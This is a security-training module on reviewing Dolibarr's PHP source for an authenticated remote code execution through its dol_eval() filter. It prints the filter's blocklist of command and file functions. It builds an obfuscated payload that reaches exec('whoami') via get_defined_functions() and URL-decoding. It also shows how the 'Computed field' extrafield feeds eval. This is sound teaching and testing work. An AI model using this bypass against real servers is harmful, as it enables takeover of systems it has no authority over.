# Dolibarr Eval Filter Bypass RCE
This module reviews the source code of Dolibarr, an open-source **PHP-based** ERP and CRM application. It demonstrates how user input is passed to a dangerous function and how to exploit it for remote code execution (RCE), bypassing server-side validation. **The attack is performed with administrative privileges**, emphasizing the mindset required to analyze and defeat backend protections.
## Overview of Dangerous Functions
When we are analyzing source code, we should pay attention to dangerous functions that can lead to serious vulnerabilities. If an application passes user-supplied input to these functions, we may be able to craft malicious input to exploit them. The impact of these vulnerabilities depends on the actions the application performs and how much we know about the target application and its environment. However, most result in some form of remote code execution.
### PHP Dangerous Functions 
These functions can be exploited if user input is not properly sanitized. Avoid using them when possible, or apply strict validation and escaping.
#### Command Execution Functions

These execute system-level commands, which can lead to **Remote Code Execution (RCE) if misused**.

| Function        | Description                                                                 |
| --------------- | --------------------------------------------------------------------------- |
| `exec()`        | Executes a command and returns the last line of the output                  |
| `passthru()`    | Executes a command and outputs the raw result directly to the browser       |
| `system()`      | Executes a command, returns the last line, and outputs the result           |
| `shell_exec()`  | Executes a command and returns the complete output as a string              |
| `` `command` `` | Backtick operator, same as `shell_exec()` (only works on Unix-like systems) |
| `popen()`       | Opens a pipe to a process for reading/writing                               |
| `proc_open()`   | Opens a process with more control over input/output streams                 |
| `pcntl_exec()`  | Executes a program, replacing the current process                           |

#### Code Execution Functions
These evaluate PHP code dynamically, which can lead to **arbitrary code execution**.

| Function                         | Description                                                                          |
| -------------------------------- | ------------------------------------------------------------------------------------ |
| `eval()`                         | Evaluates a string as PHP code                                                       |
| `assert()`                       | Acts like `eval()` when used with a string                                           |
| `preg_replace('/pattern/e',...)` | The `/e` modifier evaluates replacement string as PHP code (deprecated)              |
| `create_function()`              | Dynamically creates an anonymous function (deprecated in PHP 7.2+)                   |
| `call_user_func()`               | Calls a user-defined function (can be dangerous if function name is user-controlled) |
| `call_user_func_array()`         | Calls a callback with parameters from an array (same risk as above)                  |

## Vulnerability Discovery
To effectively review source code for vulnerabilities, we can search for dangerous functions, known as sinks. Once identified, we trace these functions back to their input sources. If the source input is controllable and no security controls exist along the data flow, the dangerous function may be exploitable.

In this Learning Unit, we will search the Dolibarr source code for dangerous functions and analyze any protective mechanisms that might impede exploitation.

### Dolibarr Source Code Analysis

If we're searching for sinks, we need to have a list of dangerous functions relevant to the programming language of our application. Since Dolibarr is a PHP application, we could start by searching for functions like `exec()`, `passthru()`, `system()`, or `shell_exec()`. These functions execute external commands or programs. If the application passes unsanitized user-input to these functions, we might be able to perform command injection attacks against the application.

The `eval()` function executed the contents of the string and displayed the results. While this example is benign, suppose we could modify the string an application passes to the `eval()` function. If the application lacked any input validation, we might be able to run arbitrary PHP code and take control of the server. This functions is difficult for developers to secure.

To search for potential security risks, we look for uses of `eval()` by typing `eval(` in the code-server *Search*. This returns `276` results across `101` files, including some unrelated uses like `dol_eval()`. To narrow the focus, we refine the search by adding a *leading space*, helping isolate direct uses of `eval()`.

We've reduced the number of results to `31` instances in `14` files. This is a more manageable number of files to review. Let's check the second result at `htdocs/core/lib/functions.lib.php`.

**The first two results** are from comments documenting the `dol_eval()` function, which starts on line `8943`.

```php
8943  /**
8944  * Replace eval function to add more security.
8945  * This function is called by verifCond() or trans() and transnoentitiesnoconv().
8946  *
8947  * @param 	string	$s					String to evaluate
8948  * @param	int		$returnvalue		0=No return (used to execute eval($a=something)). 1=Value of eval is returned (used to eval($something)).
8949  * @param   int     $hideerrors     	1=Hide errors
8950  * @param	string	$onlysimplestring	'0' (used for computed property of extrafields)=Accept all chars, '1' (most common use)=Accept only simple string with char 'a-z0-9\s^$_+-.*>&|=!?():"\',/@';',  '2' (not used)=Accept also ';[]'
8951  * @return	mixed						Nothing or return result of eval
8952  */
8953  function dol_eval($s, $returnvalue = 0, $hideerrors = 1, $onlysimplestring = '1')
```

The documentation indicates that `dol_eval()` is intended as a secure alternative to `eval()`, using the `$onlysimplestring` variable to control allowed characters. To assess its safety, we need to examine how this check is implemented and whether other protections are in place.

Notably, **the third search result** appears within the `dol_eval()` function itself, which includes four calls to `eval()` between lines `9053` and `9061`. These lines should be closely reviewed to evaluate the function’s overall security.

```php
9051  if ($returnvalue) {
9052      if ($hideerrors) {
9053          return @eval('return '.$s.';');
9054      } else {
9055          return eval('return '.$s.';');
9056      }
9057  } else {
9058      if ($hideerrors) {
9059          @eval($s);
9060      } else {
9061          eval($s);
9062      }
9063  }
```
Each call to `eval()` includes the `$s` variable. Based on the function documentation, this variable contains the string to evaluate.

Now that we know the `dol_eval()` function calls `eval()`, let's review how many places in the application call this function. We'll search for `dol_eval(` in code-server *Search*.

Our search discovered `131` results in `56` files. It's reasonable for us to conclude that this application uses this function. We'll need to further analyze this function to determine if it presents a security risk.

### Understanding the Filter Conditions
According to the `dol_eval()` function documentation, the `$onlysimplestring` variable determines which characters the function allows. Let's review that implementation, which starts on line `8969`.

```php
8968  // Test on dangerous char (used for RCE), we allow only characters to make PHP variable testing
8969  if ($onlysimplestring == '1') {
8970      // We must accept: '1 && getDolGlobalInt("doesnotexist1") && $conf->global->MAIN_FEATURES_LEVEL'
8971      // We must accept: '$conf->barcode->enabled || preg_match(\'/^AAA/\',$leftmenu)'
8972      // We must accept: '$user->rights->cabinetmed->read && !$object->canvas=="patient@cabinetmed"'
8973      if (preg_match('/[^a-z0-9\s'.preg_quote('^$_+-.*>&|=!?():"\',/@', '/').']/i', $s)) {
8974          if ($returnvalue) {
8975              return 'Bad string syntax to evaluate (found chars that are not chars for simplestring): '.$s;
8976          } else {
8977              dol_syslog('Bad string syntax to evaluate (found chars that are not chars for simplestring): '.$s);
8978              return '';
8979          }
8980          // TODO
8981          // We can exclude all parenthesis ( that are not '($db' and 'getDolGlobalInt(' and 'getDolGlobalString(' and 'preg_match(' and 'isModEnabled('
8982          // ...
8983      }
8984  } elseif ($onlysimplestring == '2') {
8985      // We must accept: (($reloadedobj = new Task($db)) && ($reloadedobj->fetchNoCompute($object->id) > 0) && ($secondloadedobj = new Project($db)) && ($secondloadedobj->fetchNoCompute($reloadedobj->fk_project) > 0)) ? $secondloadedobj->ref : "Parent project not found"
8986      if (preg_match('/[^a-z0-9\s'.preg_quote('^$_+-.*>&|=!?():"\',/@;[]', '/').']/i', $s)) {
8987          if ($returnvalue) {
8988              return 'Bad string syntax to evaluate (found chars that are not chars for simplestring): '.$s;
8989          } else {
8990              dol_syslog('Bad string syntax to evaluate (found chars that are not chars for simplestring): '.$s);
8991              return '';
8992          }
8993      }
8994  }
```
Code excerpt from `functions.lib.php`

The `dol_eval()` function includes input validation based on the `$onlysimplestring` variable, but this control is limited. Specifically:
- It only applies restrictions if `$onlysimplestring` is set to `1` or `2` (checked on lines `8969` and `8984`).
- If `$onlysimplestring` has any other value, no input validation is enforced, potentially allowing unsafe characters.
- Although the function defaults `$onlysimplestring` to `1`, there is no fallback or guard clause to handle unexpected values.

The function uses regular expressions to filter the `$s` input:
- When `$onlysimplestring == 1`: a stricter regex applies.
- When `$onlysimplestring == 2`: the regex is slightly relaxed, allowing square brackets ([ and ]).

Next, we’ll review the checks implemented between lines `8995` and `9021` for additional validation or controls.

```php
8995  if (is_array($s) || $s === 'Array') {
8996      return 'Bad string syntax to evaluate (value is Array) '.var_export($s, true);
8997  }
8998  if (strpos($s, '::') !== false) {
8999      if ($returnvalue) {
9000          return 'Bad string syntax to evaluate (double : char is forbidden): '.$s;
9001      } else {
9002          dol_syslog('Bad string syntax to evaluate (double : char is forbidden): '.$s);
9003          return '';
9004      }
9005  }
9006  if (strpos($s, '`') !== false) {
9007      if ($returnvalue) {
9008          return 'Bad string syntax to evaluate (backtick char is forbidden): '.$s;
9009      } else {
9010          dol_syslog('Bad string syntax to evaluate (backtick char is forbidden): '.$s);
9011          return '';
9012      }
9013  }
9014  if (preg_match('/[^0-9]+\.[^0-9]+/', $s)) {	// We refuse . if not between 2 numbers
9015      if ($returnvalue) {
9016          return 'Bad string syntax to evaluate (dot char is forbidden): '.$s;
9017      } else {
9018          dol_syslog('Bad string syntax to evaluate (dot char is forbidden): '.$s);
9019          return '';
9020      }
9021  }
```
Code excerpt from `functions.lib.php`

This code adds extra security checks by blocking certain special characters in the input string $s:
- Line `8998` blocks `::` (scope resolution operator in PHP, can be used to access properties or methods of a class).
- Line `9006` blocks backticks `` ` `` (used for command execution, like `shell_exec()`).
- Line `9014` blocks periods (`.`) unless they appear between two numbers (to prevent string concatenation, which can help bypass filters).

Let's move on to the final series of checks, which we can find on lines `9023` through `9038`.
```php
9023  // We block use of php exec or php file functions
9024  $forbiddenphpstrings = array('$$');
9025  $forbiddenphpstrings = array_merge($forbiddenphpstrings, array('_ENV', '_SESSION', '_COOKIE', '_GET', '_POST', '_REQUEST'));
9026  
9027  $forbiddenphpfunctions = array("exec", "passthru", "shell_exec", "system", "proc_open", "popen", "eval", "dol_eval", "executeCLI", "verifCond", "base64_decode");
9028  $forbiddenphpfunctions = array_merge($forbiddenphpfunctions, array("fopen", "file_put_contents", "fputs", "fputscsv", "fwrite", "fpassthru", "require", "include", "mkdir", "rmdir", "symlink", "touch", "unlink", "umask"));
9029  $forbiddenphpfunctions = array_merge($forbiddenphpfunctions, array("function", "call_user_func"));
9030  
9031  $forbiddenphpregex = 'global\s+\$|\b('.implode('|', $forbiddenphpfunctions).')\b';
9032  
9033  do {
9034      $oldstringtoclean = $s;
9035      $s = str_ireplace($forbiddenphpstrings, '__forbiddenstring__', $s);
9036      $s = preg_replace('/'.$forbiddenphpregex.'/i', '__forbiddenstring__', $s);
9037      //$s = preg_replace('/\$[a-zA-Z0-9_\->\$]+\(/i', '', $s);	// Remove $function( call and $mycall->mymethod(
9038  } while ($oldstringtoclean != $s);
```
Code excerpt from `functions.lib.php`

The final checks in `dol_eval()` aim to **block potentially dangerous code execution patterns**:
- Lines `9024`–`9025` define `$forbiddenphpstrings` with elements like `$_GET` and `$_POST` to block access to request data.
- Lines `9027`–`9029` define `$forbiddenphpfunctions`, including functions for command execution (e.g., `exec`, `shell_exec`), file operations, and even `base64_decode`.
- Line `9031` creates a regex from the forbidden function names.
- Lines `9033`–`9038` run a loop that replaces any matches in `$s` with `"__forbiddenstring__"`.
- After this, if `"__forbiddenstring__"` is found in `$s`, the function blocks execution and returns an error or blank value.

#### Recap of `dol_eval()` protections:
- Uses `$onlysimplestring` to control allowed characters.
- Blocks `::`, backticks (`` ` ``), and most uses of `.`.
- Applies a blocklist of dangerous strings and functions.
- Specifically blocks `base64_decode`, but not other encoding/decoding techniques.

Despite these layers of defense, vulnerabilities may remain. The next step is to attempt bypassing these protections to achieve code execution.
### Filter Bypass the Hard Way
To explore bypassing the blocklist and executing arbitrary PHP code, we focus on calling functions **without directly naming them**. Instead of searching for more dangerous functions, we examine PHP's `get_defined_functions()`.

This function returns an array of all available functions—both built-in and user-defined. Built-in functions are accessible via `$arr["internal"]`.

By accessing this array, it's possible to invoke a function indirectly using its index or a variable reference, potentially evading blocklist detection. To test this idea:
```bash
student@dolibarr:~$ php -a
Interactive shell

php > print_r(get_defined_functions());
Array
(
    [internal] => Array
        (
            [0] => zend_version
            [1] => func_num_args
            [2] => func_get_arg
            [3] => func_get_args
            [4] => strlen
            [5] => strcmp
            [6] => strncmp
...
            [1582] => dl
            [1583] => cli_set_process_title
            [1584] => cli_get_process_title
        )

    [user] => Array
        (
        )

)
```

As expected, the function returned an array containing all the defined functions.

Let's verify we can invoke a function based on its array index value. We'll try `strlen()`, which is at index `4` of the `"internal"` array based on the output above.
```bash
php > echo get_defined_functions()["internal"][4]("hello world");
11
```
Excellent. We invoked the `strlen()` function by accessing its array index in the array returned from `get_defined_functions()`. After reviewing the full list of values returned by `get_defined_functions()`, we'll find the functions we're most interested in start at index `550`.
```bash
php > print_r(get_defined_functions());
Array
(
    [internal] => Array
        (
...
            [550] => exec
            [551] => system
            [552] => passthru
            [553] => escapeshellcmd
            [554] => escapeshellarg
            [555] => shell_exec
...
```
```bash
php > echo get_defined_functions()["internal"][550];
exec
php >
```

Let's verify we can invoke `exec()` this way and run `whoami`.
```bash
php > echo get_defined_functions()["internal"][550]("whoami");
student
```
Excellent. We can invoke `exec()` without specifying the function name directly. We can build a payload using this approach to bypass the restrictions in the `dol_eval()` function.

A challenge with using `get_defined_functions()` is that the index of a desired function (like `base64_decode()`) may vary, since Dolibarr might load additional functions at runtime.

To work around this, we could use `array_search()` to locate the function in the array. 

```bash
php > echo array_search("exec", get_defined_functions()["internal"]);
550
php >
```

However, we can't use the function name (`exec`) since the `dol_eval()` function blocks those keywords. 

Since direct use of blocked function names (like `base64_decode()`) isn't allowed by `dol_eval()`, we need alternatives. Fortunately, PHP provides native support for other encoding schemes—such as URL-encoding—that aren't blocked, offering potential paths for bypass.

Although PHP’s `urlencode()` doesn’t encode alphanumeric characters, URL-encoding can still represent them using tools like *Burp Suite Decoder*. For example, the word `"exec"` can be encoded as `%65%78%65%63`.
```bash
php > echo urldecode("%65%78%65%63");
exec
```

Excellent. Now we should be able to chain together `urldecode()` and `array_search()` to find the index of `exec()` in the array returned by `get_defined_functions()`. We'll pass the `urldecode()` function call to `array_search()` as the needle and pass `get_defined_functions()` as the haystack. However, we want to access the `"internal"` array in the `get_defined_functions()` results.

```php
php > echo array_search(urldecode("%65%78%65%63"), get_defined_functions()["internal"]);
550
```

Now that we can dynamically retrieve the index of `exec()`, we can build a complete payload that searches for the function and invokes it.
```bash
php > echo get_defined_functions()["internal"][array_search(urldecode("%65%78%65%63"), get_defined_functions()["internal"])]("whoami");
student
```
We've verified that we can invoke an arbitrary function without specifying the function name. However, our payload uses square braces and percent signs.

**REMINDER**: The value of the `$onlysimplestring` parameter controls which characters are allowed. We'll need to perform more analysis to find any calls to `dol_eval()` with the `$onlysimplestring` parameter set to anything other than `1` or `2`. We'll continue this analysis in the next Learning Unit.

## Bypass Security Filter to Trigger Eval
This Learning Unit covers the following Learning Objectives:
- Identify a vulnerable function call
- Exploit Dolibarr for remote code execution

In this Learning Unit, we will continue our source code analysis. We'll need to find calls `to dol_eval()` with the `$onlysimplestring` parameter set to anything other than `1` or `2` for our payload to work.

### Finding the Target
We'll return to VSCode and *Search* code for all instances of `dol_eval()` with any `$onlysimplestring` other than `1` or `2`. We'll need to use a regular expression to account for the different values passed to `dol_eval()` in each parameter.
```
dol_eval\(\$[\w\[\]']+,\s\d,\s\d,\s'(?!1|2)'\)
```
We want to search for the literal term `"dol_eval("` followed by any variable or word, a comma, any two digits separated by a comma, and finally, any value other than `1` or `2`.

We'll enter this value in the *Search* field and click the `Use Regular Expression` button (a period with an asterisk).

Three results, all from `commonobject.class.php`. Analyzing the search results, we can determine the `insertExtraFields()`, `updateExtraFields()`, and `showOutputField()` functions each contain a call to `dol_eval()` with an empty string for the `$onlysimplestring` parameter.

The documentation for the `showOutputField()` function states `"Return HTML string to show a field into a page"`. This could be very useful for us. If this function returns a value which the web application then displays, we could use it to verify remote code execution with `"whoami"`.

Let's review a few key lines from this function:
```php
7432  /**
7433   * Return HTML string to show a field into a page
7434   * Code very similar with showOutputField of extra fields
7435   *
7436   * @param  array   $val            Array of properties of field to show
7437   * @param  string  $key            Key of attribute
7438   * @param  string  $value          Preselected value to show (for date type it must be in timestamp format, for amount or price it must be a php numeric value)
7439   * @param  string  $moreparam      To add more parametes on html input tag
7440   * @param  string  $keysuffix      Prefix string to add into name and id of field (can be used to avoid duplicate names)
7441   * @param  string  $keyprefix      Suffix string to add into name and id of field (can be used to avoid duplicate names)
7442   * @param  mixed   $morecss        Value for css to define size. May also be a numeric.
7443   * @return string
7444   */
7445  public function showOutputField($val, $key, $value, $moreparam = '', $keysuffix = '', $keyprefix = '', $morecss = '')
7446  {
...
7476      $computed = empty($val['computed']) ? '' : $val['computed'];
...
7511      // If field is a computed field, value must become result of compute
7512      if ($computed) {
7513          // Make the eval of compute string
7514          //var_dump($computed);
7515          $value = dol_eval($computed, 1, 0, '');
7516      }
...
7845      $out = $value;
7846  
7847      return $out;
7848  }
```
The key focus is how the `dol_eval()` function is used:

- The `$val` parameter is an array.
- On **line `7476`**, the value of `$val["computed"]` is assigned to `$computed`.
- If `$computed` is not false, it’s passed to `dol_eval()` on **line `7515`**, and the result is stored in `$value`.
- Although a large `if...elseif` block modifies `$value` based on `$val["type"]`, it's not relevant to the current analysis.
- Finally, on **lines `7845` and `7847`**, the function **returns the result** of the `dol_eval()` call.

In short, user-controlled input from `$val["computed"]` can flow into `dol_eval()`, and its output is ultimately returned.

Let's scroll to the top of this file to understand more about this function and its class.
```php
41  /**
42   *  Parent class of all other business classes (invoices, contracts, proposals, orders, ...)
43  */
44  abstract class CommonObject
45  {
```

The `CommonObject` class is a parent class for various business-related classes. Its public method `showOutputField()`—which contains the vulnerability—is inherited by all child classes, unless explicitly overridden. To identify these subclasses, we can *Search* for `extends CommonObject` in code-server.

After a few moments, we receive `154` results in `130` files. Each class in the search results potentially increases the attack surface of this vulnerability.

We could continue tracing this vulnerability through the source code, but Dolibarr is highly configurable and contains a multitude of business objects. Our Dolibarr VM has the application running in its default state.

Let's log in to the application at `http://dolibarr/dolibarr/index.php`. After logging in, we'll check which modules are enabled by clicking on *Modules/Applications* or browsing to `http://dolibarr/dolibarr/admin/modules.php?mainmenu=home`.

The *Users & Groups* module is the only one enabled by default. Let's click on the gear icon to determine what configuration options are available to us.

Clicking through the available sub-options, we'll find that the `"Complementary attributes (Users)"` page allows us to define custom attributes which includes `"Computed field"`.

This functionality seems to match with the vulnerable functions we identified earlier. Let's click the plus (`+`) button to add a new attribute and then check the tooltip for the *Computed field*.

The pop-up window states we can enter `"any PHP coding to get a dynamic computed value"`. This confirms our suspicions that this functionality likely calls `dol_eval()`.

Let's start with a simple payload to verify the application passes this string to `eval()`. We'll type `"test"` as the *Label or translation key* and select `"String (1 line)"` for the *Type*. The application will set some default values, which we'll leave as is. Next, we'll type `4+7;` in the *Computed field*.

Once we've entered those values, we'll click `Save`. The application returns us to the Users modules setup page, but there's no indication of whether it called the vulnerable function.

Since we created a new attribute for the User object, let's check the list of users. We can find it by clicking *Users & Groups*, then clicking *List of users* after the page reloads.

The list of users on the Users page includes a test column with a value of `11` in it. This is a strong indication that the application passed the value we entered in the Computed field to the `dol_eval()` function.

